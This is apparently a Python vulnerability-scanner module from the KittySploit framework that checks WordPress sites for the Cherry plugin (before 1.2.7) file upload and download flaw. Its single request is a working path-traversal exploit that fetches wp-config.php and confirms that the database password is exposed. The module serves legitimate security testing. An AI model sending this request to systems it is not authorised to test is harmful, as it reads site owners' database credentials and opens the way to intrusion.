#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress plugin Cherry < 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Cherry < 1.2.7 - Unauthenticated Arbitrary File Upload and Download Detection',
        'description': 'WordPress plugin Cherry < 1.2.7 has a vulnerability which enables an attacker to upload files directly to the server. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wpscan', 'wordpress', 'wp-plugin', 'lfi', 'wp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/90034817-dee7-40c9-80a2-1f1cd1d033ee',
            'https://support.alertlogic.com/hc/en-us/articles/115003048083-06-19-17-WordPress-CMS-Cherry-Plugin-Arbitrary-File-Upload-RCE',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress Cherry < 1.2.7 - Unauthenticated Arbitrary File Upload and Download detected",
                path='/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
            )
            return True
        return False

